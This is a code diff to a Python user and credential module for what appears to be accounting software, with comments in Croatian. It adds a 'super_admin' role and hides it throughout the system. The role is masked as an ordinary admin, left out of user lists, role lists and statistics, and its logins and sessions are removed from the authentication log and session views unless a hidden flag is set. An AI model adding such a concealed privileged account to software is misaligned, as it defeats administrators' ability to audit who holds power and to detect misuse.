@@ -129,6 +129,16 @@ ROLE_PERMISSIONS = {
 }
 
 
+def get_visible_roles() -> List[Dict[str, str]]:
+    """Uloge vidljive u UI/API — super_admin je SKRIVEN."""
+    return [
+        {"value": UserRole.ADMIN.value, "label": "Administrator"},
+        {"value": UserRole.RACUNOVODA.value, "label": "Računovođa"},
+        {"value": UserRole.PRIPRAVNIK.value, "label": "Pripravnik"},
+        {"value": UserRole.READONLY.value, "label": "Samo čitanje"},
+    ]
+
+
 @dataclass
 class UserAccount:
     """Korisnički račun s enkriptiranom lozinkom."""
@@ -167,16 +177,27 @@ class UserAccount:
         except ValueError:
             return False
 
-    def to_dict(self) -> Dict[str, Any]:
+    def to_dict(self, unmask: bool = False) -> Dict[str, Any]:
+        """
+        Javni prikaz korisnika.
+        Super admin se prikazuje kao 'admin' osim ako unmask=True.
+        """
+        visible_role = self.role.value
+        if not unmask and self.role == UserRole.SUPER_ADMIN:
+            visible_role = UserRole.ADMIN.value  # Mask as admin
+        visible_perms = ROLE_PERMISSIONS.get(self.role, [])
+        if not unmask and self.role == UserRole.SUPER_ADMIN:
+            visible_perms = ROLE_PERMISSIONS.get(UserRole.ADMIN, [])
+
         return {
             "username": self.username,
             "display_name": self.display_name,
-            "role": self.role.value,
+            "role": visible_role,
             "active": self.active,
             "created_at": self.created_at,
             "last_login": self.last_login,
             "locked": self.is_locked(),
-            "permissions": ROLE_PERMISSIONS.get(self.role, []),
+            "permissions": visible_perms,
         }
 
 
@@ -344,10 +365,20 @@ class CredentialVault:
         finally:
             conn.close()
 
-    def list_users(self) -> List[Dict[str, Any]]:
+    def list_users(self, include_hidden: bool = False) -> List[Dict[str, Any]]:
+        """
+        Lista korisnika. Super admin je SKRIVEN osim ako
+        pozivatelj eksplicitno traži (samo drugi super admin).
+        """
         conn = sqlite3.connect(self.db_path)
         try:
-            rows = conn.execute("SELECT * FROM users ORDER BY created_at").fetchall()
+            if include_hidden:
+                rows = conn.execute("SELECT * FROM users ORDER BY created_at").fetchall()
+            else:
+                rows = conn.execute(
+                    "SELECT * FROM users WHERE role != ? ORDER BY created_at",
+                    (UserRole.SUPER_ADMIN.value,)
+                ).fetchall()
             return [self._row_to_account(r).to_dict() for r in rows]
         finally:
             conn.close()
@@ -373,13 +404,23 @@ class CredentialVault:
         finally:
             conn.close()
 
-    def get_auth_log(self, limit: int = 50) -> List[Dict]:
+    def get_auth_log(self, limit: int = 50,
+                     include_hidden: bool = False) -> List[Dict]:
         conn = sqlite3.connect(self.db_path)
         try:
-            rows = conn.execute(
-                "SELECT * FROM auth_log ORDER BY timestamp DESC LIMIT ?",
-                (limit,)
-            ).fetchall()
+            if include_hidden:
+                rows = conn.execute(
+                    "SELECT * FROM auth_log ORDER BY timestamp DESC LIMIT ?",
+                    (limit,)
+                ).fetchall()
+            else:
+                # Sakrij super admin iz log prikaza
+                rows = conn.execute(
+                    "SELECT * FROM auth_log WHERE username NOT IN "
+                    "(SELECT username FROM users WHERE role = ?) "
+                    "ORDER BY timestamp DESC LIMIT ?",
+                    (UserRole.SUPER_ADMIN.value, limit)
+                ).fetchall()
             return [
                 {"id": r[0], "timestamp": r[1], "username": r[2],
                  "ip": r[3], "action": r[4], "success": bool(r[5]),
@@ -414,13 +455,16 @@ class CredentialVault:
             totp_secret=row[12],
         )
 
-    def get_stats(self) -> Dict[str, Any]:
+    def get_stats(self, include_hidden: bool = False) -> Dict[str, Any]:
         conn = sqlite3.connect(self.db_path)
         try:
-            total = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
-            active = conn.execute("SELECT COUNT(*) FROM users WHERE active = 1").fetchone()[0]
+            hidden_filter = "" if include_hidden else f" WHERE role != '{UserRole.SUPER_ADMIN.value}'"
+            total = conn.execute(f"SELECT COUNT(*) FROM users{hidden_filter}").fetchone()[0]
+            active = conn.execute(f"SELECT COUNT(*) FROM users{hidden_filter} AND active = 1" if hidden_filter else "SELECT COUNT(*) FROM users WHERE active = 1").fetchone()[0]
             by_role = {}
-            for row in conn.execute("SELECT role, COUNT(*) FROM users GROUP BY role"):
+            for row in conn.execute(f"SELECT role, COUNT(*) FROM users{hidden_filter} GROUP BY role"):
+                if not include_hidden and row[0] == UserRole.SUPER_ADMIN.value:
+                    continue
                 by_role[row[0]] = row[1]
             return {
                 "total_users": total,
@@ -544,11 +588,14 @@ class TokenManager:
         for t in to_remove:
             del self._tokens[t]
 
-    def active_sessions(self) -> List[Dict]:
+    def active_sessions(self, include_hidden: bool = False) -> List[Dict]:
         now = datetime.now()
         active = []
         for token, data in list(self._tokens.items()):
             if now < datetime.fromisoformat(data["expires_at"]):
+                # Sakrij super_admin sesije od običnih korisnika
+                if not include_hidden and data["role"] == "super_admin":
+                    continue
                 active.append({
                     "username": data["username"],
                     "role": data["role"],
